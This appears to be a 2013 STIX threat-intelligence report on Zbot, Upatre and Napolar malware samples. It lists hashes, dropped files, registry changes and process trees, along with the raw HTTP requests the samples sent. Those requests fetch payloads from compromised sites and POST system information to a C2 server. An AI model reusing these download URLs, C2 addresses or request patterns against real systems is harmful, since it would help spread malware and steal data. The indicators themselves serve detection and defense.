stix:STIX_Header.stix:Title: Malicious Files Submitted for Analysis Identified as Zbot and Napolar
stix:STIX_Header.stix:Description: On 18 November 2013, multiple files were submitted for analysis from an international organization. These files were identified as Zbot Trojans, Upatre downloaders, and the Buzus/Napolar information stealing malware and backdoor associated with the Zeus crimeware kit. If successfully installed, they called back to 16 sites to download additional malware or send the compromised systems' information.

stix:Indicator.indicator:Description:
This malicious file was identified as a Zbot Trojan. Upon execution, it modified several Internet Settings in the Registry Key.
DeleteValueKey C:\Documents and Settings\[user]\Local Settings\Temp\budha.exe -> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer
DeleteValueKey C:\Documents and Settings\[user]\Local Settings\Temp\budha.exe -> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyOverride
DeleteValueKey C:\Documents and Settings\[user]\Local Settings\Temp\budha.exe -> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL
SetValueKey C:\Documents and Settings\[user]\Local Settings\Temp\budha.exe -> HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Hardware Profiles\0001\Software\Microsoft\windows\CurrentVersion\Internet Settings\ProxyEnable
SetValueKey C:\Documents and Settings\[user]\Local Settings\Temp\budha.exe -> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\MigrateProxy
SetValueKey C:\Documents and Settings\[user]\Local Settings\Temp\budha.exe -> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable
SetValueKey C:\Documents and Settings\[user]\Local Settings\Temp\budha.exe -> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\DefaultConnectionSettings
References to hard-coded executables and URLs exist inside the malware's code. The following strings were identified:
/images/admin.exe /img/conf.exe cry-havok.org maitikio.com budha.exe kilf.exe

The file 2013111812398784524.exe (MD5: 8b7ba6159d9f7b4e492b5cf8cb3ba30a) created budha.exe and dropped it inside the compromised user's %TEMP% directory.
Process: created %USERPROFILE%\~\~\2013111812398784524.exe -> %USERPROFILE%\Local Settings\Temp\budha.exe
File: Write %USERPROFILE%\~\~\2013111812398784524.exe -> %USERPROFILE%\Local Settings\Temp\budha.exe
File: Delete %USERPROFILE%\Local Settings\Temp\budha.exe -> %USERPROFILE%\~\~\2013111812398784524.exe
The file budha.exe is a copy of 2013111812398784524.exe with an SSDeep match of 99%. The file budha.exe made attempts to download files from two remote sites.

This Zbot Trojan was named either admin.exe or conf.exe.
The file buddha.exe (MD5: ec06aaff1f379c51a9e6242102fa4548) downloaded these files from either https://cry-havok.org/images/admin.exe or https://maitikio.com/img/conf.exe.

The file budha.exe (MD5: ec06aaff1f379c51a9e6242102fa4548) sent a GET request for conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) to this URL via port 443.
GET /img/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: maitikio.com Cache-Control: no-cache
The domain resolved to 199.189.248.96.

The file budha.exe (MD5: ec06aaff1f379c51a9e6242102fa4548) sent a GET request for admin.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) to this URL via port 443.
GET /images/admin.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: cry-havok.org Cache-Control: no-cache
The domain resolved to IP 199.189.248.96.

The file Invoice.PDF.exe has the same network and registry interactions as 2013111812398784524.exe (MD5: 8b7ba6159d9f7b4e492b5cf8cb3ba30a).
Hard-coded executables and URLs are embedded in its code. Upon execution, the malware dropped lsase.exe (MD5: ca544173e3662164a95ea44e97d6dc14) inside the user's %TEMP% directory.
The following hard-coded URLs and executables were observed in the malware code:
lsase.exe lsasc.exe daily-fitness.com /img/conf.exe realdowncomforters.com /wp-content/uploads/2013/02/conf.exe harrowmedia.com /lead/conf.exe
After Invoice.PDF.exe performed its function, it exited.
Process: created %WINDIR%\explorer.exe -> %USERPROFILE%\~\Invoice.PDF.exe Process: created %USERPROFILE%\~\Invoice.PDF.exe -> %USERPROFILE%\Local Settings\Temp\lsase.exe file: Write %USERPROFILE%\~\Invoice.PDF.exe -> %USERPROFILE%\Local Settings\Temp\lsase.exe file: Delete %USERPROFILE%\Local Settings\Temp\lsase.exe -> %USERPROFILE%\~\Invoice.PDF.exe

This file was created by Invoice.PDF.exe (MD5: 64a27c2eee6c3ad9e473776a0850d45e). This executable is located inside the user's %TEMP% directory. The SSDeep hashes for the files lsase.exe and Invoice.PDF.exe matched each other by 99%.
Communications were observed to the following domains:
realdowncomforters.com (199.229.232.99) harrowmedia.com (199.229.232.99) daily-fitness.com (199.229.232.99)

The file lsase.exe (MD5: ca544173e3662164a95ea44e97d6dc14) sent a GET request to download conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via SSL on port 443.
GET /wp-content/uploads/2013/02/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: realdowncomforters.com Cache-Control: no-cache
The domain resolved to IP 199.229.232.99.

The file lsase.exe (MD5: ca544173e3662164a95ea44e97d6dc14) sent a GET request to download conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via SSL on port 443.
GET /lead/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: harrowmedia.com Cache-Control: no-cache

The file lsase.exe (MD5: ca544173e3662164a95ea44e97d6dc14) sent a GET request to download conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via HTTPS on port 443.
GET /img/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: daily-fitness.com Cache-Control: no-cache
The domain resolved to IP 199.229.232.99.

The file MSG00057.exe has the same network and registry interactions as 2013111812398784524.exe (MD5: 8b7ba6159d9f7b4e492b5cf8cb3ba30a).
Upon execution, the malware dropped gine.exe (MD5: 85a50e3633b74e46ca8e42664cc75e2b) inside the user's %TEMP% directory.
The following are the hard-coded URLs and executables: gine.exe gines.exe open Updates downloader text/* application/* www.cecileduquesne.com /templates/BoxyBuzz/images/conf.exe loadoutpress.com /joomla/conf.exe arcdesign.info /wp-content/uploads/2013/09/conf.exe
When MSG00057.exe was done performing its job, it exited.
Process: Created %WINDIR%\explorer.exe -> %USERPROFILE%\~\MSG00057.exe Process: Created %USERPROFILE%\~\MSG00057.exe -> %USERPROFILE%\Local Settings\Temp\gine.exe File: Write %USERPROFILE%\~\MSG00057.exe -> %USERPROFILE%\Local Settings\Temp\gine.exe File: Delete %USERPROFILE%\Local Settings\Temp\gine.exe -> %USERPROFILE%\~\MSG00057.exe

The file gine.exe was created by MSG00057.exe (MD5: c67fd86a6e3f6d4ec06ba2291e0f3f9a). This executable is located inside the user's %TEMP% directory. Using SSDeep for file comparison, gine.exe matched MSG00057.exe at nearly 100%.
This file called back to the following domains:
loadoutpress.com (38.99.253.230) arcdesign.info cecileduquesne.com (38.99.253.130)

The file gine.exe (MD5: 85a50e3633b74e46ca8e42664cc75e2b) sent a GET request to download conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) from this URL via SSL on port 443.
GET /joomla/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: loadoutpress.com Cache-Control: no-cache
This domain resolved to IP 38.99.253.230.

The file gine.exe (MD5: 85a50e3633b74e46ca8e42664cc75e2b) sent a GET request to download conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) from this URL via SSL on port 443.
GET /wp-content/uploads/2013/09/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: arcdesign.info Cache-Control: no-cache

The file gine.exe (MD5: 85a50e3633b74e46ca8e42664cc75e2b) sent a GET request to download conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) from this URL via SSL on port 443.
GET /templates/BoxyBuzz/images/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: www.cecileduquesne.com Cache-Control: no-cache
This domain resolved to IP 38.99.253.130.

The file message.wav.exe has the same network and registry interactions as 2013111812398784524.exe (MD5: 8b7ba6159d9f7b4e492b5cf8cb3ba30a).
The file contained two hard-coded executables and three hard-coded URLs. Upon execution, the malware dropped gerif.exe (MD5: 9c4041e7089ee3635344ab18905d3731) inside the user's %TEMP% directory.
The following are the hard-coded URLs and executables:
gerif.exe geria.exe open Updates downloader text/* application/* veemeo.com /wp-content/uploads/2013/10/conf.exe binaryoptionsfundamentals.com /wp-content/uploads/2012/04/conf.exe headachesymptomsrelief.com /wp-content/uploads/2012/01/conf.exe
Once "message.wav.exe" is done performing its job, it exits.
Process: Created %WINDIR%\explorer.exe -> %USERPROFILE%\~\message.wav.exe Process: Created %USERPROFILE%\Desktop\message.wav.exe -> %USERPROFILE%\Local Settings\Temp\gerif.exe File: Write %USERPROFILE%\~\message.wav.exe -> %USERPROFILE%\Local Settings\Temp\gerif.exe File: Delete %USERPROFILE%\Local Settings\Temp\gerif.exe -> %USERPROFILE%\~\message.wav.exe

The file gerif.exe was created by message.wav.exe (MD5: b522eef86294bb3ebd7b79eacebcbb55). This executable is located inside the user's %TEMP% directory. Using SSDeep for file comparison, gerif.exe matched message.wav.exe by 99%.
Communications were observed to three domains:
veemeo.com (38.102.227.93) binaryoptionsfundamentals.com (38.102.227.91) headachesymptomsrelief.com (38.102.227.94)

The file gerif.exe (MD5: 9c4041e7089ee3635344ab18905d3731) sent a GET request for conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via SSL on port 443.
GET /wp-content/uploads/2013/10/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: veemeo.com Cache-Control: no-cache
The domain resolved to IP 38.102.227.93.

The file gerif.exe (MD5: 9c4041e7089ee3635344ab18905d3731) sent a GET request for conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via SSL on port 443.
GET /wp-content/uploads/2012/04/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: binaryoptionsfundamentals.com Cache-Control: no-cache
The domain resolved to IP 38.102.227.91.

The file gerif.exe (MD5: 9c4041e7089ee3635344ab18905d3731) sent a GET request for conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via SSL on port 443.
GET /wp-content/uploads/2012/01/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: headachesymptomsrelief.com Cache-Control: no-cache
The domain resolved to IP 38.102.227.94.

The file Transaction.exe has the same network and registry interactions as 2013111812398784524.exe (MD5: 8b7ba6159d9f7b4e492b5cf8cb3ba30a).
The file Transaction.exe contained two hard-coded executables and three hard-coded URLs. Upon execution, the malware dropped clo.exe (MD5: d16da34204ea3bc9207b353331985929) inside the user's %TEMP% directory.
The following hard-coded strings were found in the malware:
clo.exe clow.exe open Updates downloader text/* application/* technofreek.com /image/conf.exe starhomeappliance.com /media/catalog/product/0/0/conf.exe swhi.ca /wildstyle/conf.exe
After Transaction.exe performed its function, it exited.
Process: Created %WINDIR%\explorer.exe -> %USERPROFILE%\~\Transaction.exe Process: Created %USERPROFILE%\~\Transaction.exe -> %USERPROFILE%\Local Settings\Temp\clo.exe File: Write %USERPROFILE%\~\Transaction.exe -> %USERPROFILE%\Local Settings\Temp\clo.exe File: Delete %USERPROFILE%\Local Settings\Temp\clo.exe -> %USERPROFILE%\~\Transaction.exe

The file clo.exe was created by Transaction.exe (MD5: e2f31930afc21b04b110900d7912f00a). This executable is located inside the user's %TEMP% directory. Using SSDeep for file comparison, clo.exe matched Transaction.exe by 99%.
Communication was observed from clo.exe to these domains:
technofreek.com (96.47.32.117) starhomeappliance (96.47.32.118) swhi.ca (96.47.32.120)

The file clo.exe (MD5: d16da34204ea3bc9207b353331985929) sends a GET request for conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via HTTPS on port 443.
GET /image/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: technofreek.com Cache-Control: no-cache Connection: Keep-Alive
The domain resolved to 96.47.32.117.

The file clo.exe (MD5: d16da34204ea3bc9207b353331985929) sends a GET request for conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via SSL on port 443.
GET /media/catalog/product/0/0/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: starhomeappliance.com Cache-Control: no-cache
The domain resolved to IP 96.47.32.118.

The file clo.exe (MD5: d16da34204ea3bc9207b353331985929) sends a GET request for conf.exe (MD5: 3387b0758dfca583a3177d4b275a44bf) via SSL on port 443.
GET /wildstyle/conf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: swhi.ca Cache-Control: no-cache
The domain resolved to IP 96.47.32.120.

The file Payment_Advice.exe has the same network and registry interactions as 2013111812398784524.exe (MD5: 8b7ba6159d9f7b4e492b5cf8cb3ba30a). Payment_Advice.exe contained two hard-coded executables and one hard-coded URL. Upon execution, the malware dropped gtor.exe (MD5: c2f1a53db498f04a75f4d25605489273) inside the user's %TEMP% directory.
The following strings were observed in the malware:
gtor.exe gtory.exe open Updates downloader text/* application/* ashwanidhawan /images/index.exe carostringquartet.com /images/main.exe
After Payment_Advice.exe performed its function, it exited.
Process: Created %WINDIR%\explorer.exe -> %USERPROFILE%\~\Payment_Advice.exe Process: Created %USERPROFILE%\~\Payment_Advice.exe -> %USERPROFILE%\Local Settings\Temp\gtor.exe File: Write %USERPROFILE%\~\Payment_Advice.exe -> %USERPROFILE%user01\Local Settings\Temp\gtor.exe File: Delete %USERPROFILE%\Local Settings\Temp\gtor.exe -> %USERPROFILE%\~\Payment_Advice.exe

The file gtor.exe was created by Payment_Advice.exe (MD5: e7c8ab7777d4908319adfd7079163861). This executable was dropped in the user's %TEMP% directory. Using SSDeep for file comparison, gtor.exe matched Payment_Advice.exe by nearly 100%.

The file gtor.exe (MD5: c2f1a53db498f04a75f4d25605489273) sends a GET request for the file main.exe via SSL on port 443.
GET /images/main.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: carostringquartet.com Cache-Control: no-cache
This domain resolved to IP 122.201.104.72.

The following describes document.exe:
Description: Outlookbar Control Company: UniCont Soft File Version: 1.3.0.2 Date Created: 11/14/2013 1:04 PM Size: 672 KB
This file ran in explorer.exe and dropped test09848.exe in the user's %TEMP% directory. In addition, it had autorun properties to enable persistence after a reboot.
Process: Created %WINDIR%\explorer.exe -> %WINDIR%\explorer.exe Process: Terminated %WINDIR%\explorer.exe -> %WINDIR%\explorer.exe Process: Created %WINDIR%\explorer.exe -> %USERPROFILE%\~\document.exe File: Write %WINDIR%\explorer.exe -> %USERPROFILE%\~\document\document.exe Process: Created %USERPROFILE%\~\document.exe -> %USERPROFILE%\~\document.exe Process: Terminated %WINDIR%\explorer.exe -> %USERPROFILE%\~\document.exe File: Write %USERPROFILE%\~\document.exe -> %USERPROFILE%\Local Settings\Temp\test09848.exe Process: Created %USERPROFILE%\Start Menu\Programs\Startup\{GUID}.exe -> %USERPROFILE%\Start Menu\Programs\Startup\{GUID}.exe File: Write %USERPROFILE%\~\document.exe -> %USERPROFILE%\Start Menu\Programs\Startup\{GUID}.exe File: Write %USERPROFILE%\Start Menu\Programs\Startup\{GUID}.exe -> %USERPROFILE%\Local Settings\Temp\test09848.exe Process: Terminated %USERPROFILE%\Start Menu\Programs\Startup\{GUID}.exe -> %USERPROFILE%\Start Menu\Programs\Startup\{GUID}.exe
This file sent system-specific information from the infected systems to its C2 server at IP 124.248.205.29.

The file document.exe (MD5: e94d25270368b1e7a31af9e48b4006dc) sent system information from infected systems to a C2 server at IP 124.248.205.29:
POST /mik/ HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: 124.248.205.29 Content-Length: 77 Cache-Control: no-cache v=1.1&u=[USERNAME]&c=[OS_VERSION]&s={GUID}&w=2.5.1&b=32

The file test09848.exe was created by document.exe (MD5: e94d25270368b1e7a31af9e48b4006dc) and dropped in the user's %TEMP% directory. Using SSDeep for file comparison, test09848.exe matched document.exe by almost 100%.
